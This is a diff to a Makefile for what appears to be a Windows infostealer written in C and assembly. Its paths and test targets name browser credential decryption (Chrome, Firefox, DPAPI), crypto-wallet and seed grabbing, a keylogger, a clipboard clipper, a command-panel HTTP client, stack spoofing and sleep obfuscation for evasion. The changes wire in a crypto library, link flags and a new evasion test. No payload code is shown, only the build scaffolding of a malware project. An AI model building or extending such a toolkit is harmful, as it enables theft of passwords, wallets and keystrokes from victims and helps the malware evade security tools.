@@ -1,7 +1,7 @@
 CC = x86_64-w64-mingw32-gcc
 NASM = nasm
 CFLAGS = -Wall -Wextra -Wno-error -O2 -flto -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
-LDFLAGS = -flto -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows
+LDFLAGS = -flto -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows -lkernel32
 
 SRCS = src/main.c \
        src/rt/rt_startup.c \
@@ -49,6 +49,7 @@ SRCS = src/main.c \
        src/crypto/chrome_crypto.c \
        src/crypto/firefox_crypto.c \
        src/crypto/chacha_poly.c \
+       src/crypto/monocypher.c \
        src/crypto/archive_crypt.c \
        src/crypto/dpapi.c \
        src/crypto/chrome_key.c \
@@ -104,7 +105,7 @@ $(OBJ_DIR)/%.o: src/%.c
 
 $(OBJ_DIR)/asm/%.o: asm/%.asm
 	@mkdir -p $(dir $@)
-	$(NASM) -f win64 $< -o $@
+	$(NASM) -f win64 -I include/ $< -o $@
 
 clean:
 	rm -rf $(OBJ_DIR) $(TARGET)
@@ -156,10 +157,14 @@ test-stack-spoof: tests/test_stack_spoof_offsets.c include/stack_spoof_layout.h 
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_stack_spoof_offsets tests/test_stack_spoof_offsets.c
 	./tests/test_stack_spoof_offsets
 
+test-sleep-chain: tests/test_sleep_chain.c src/evasion/sleep_obfusc.c include/sleep_obfusc.h
+	$(TEST_CC) $(TEST_CFLAGS) -DTEST_SLEEP_CHAIN -o tests/test_sleep_chain tests/test_sleep_chain.c src/evasion/sleep_obfusc.c
+	./tests/test_sleep_chain
+
 clean-tests:
 	rm -f tests/test_crypto tests/test_sqlite tests/test_peb tests/test_chromium \
 	      tests/test_wallets tests/test_messengers tests/test_network tests/test_evasion \
-	      tests/test_lz4 tests/test_chunked tests/test_rt_str tests/test_rt tests/test_seed_grabber \
+	      tests/test_stack_spoof tests/test_stack_spoof_offsets tests/test_sleep_chain \
 	      tests/test_scoring tests/test_asn1 tests/test_base64 tests/test_json_extract \
 	      tests/*.o tests/*.gcda tests/*.gcno
 
@@ -260,7 +265,8 @@ test-all: test-hash test-crypto test-sqlite test-peb test-chromium test-wallets 
           test-rt test-scoring test-asn1 test-base64 \
           test-mock-seams test-fixtures test-sqlite-fault test-network-mock test-crypto-mock test-clipper test-wifi test-keylogger test-gaming test-twofa test-vpn \
           test-export-resolve test-file-utils test-ws2 test-socks5 test-proxy test-panel-http test-schannel \
-          test-chrome-crypto test-firefox-crypto test-archive-crypt
+          test-chrome-crypto test-firefox-crypto test-archive-crypt \
+          test-stack-spoof test-sleep-chain
 	@echo "=== ALL TEST SUITES PASSED ==="
 
 # ── Coverage ─────────────────────────────────────────────────
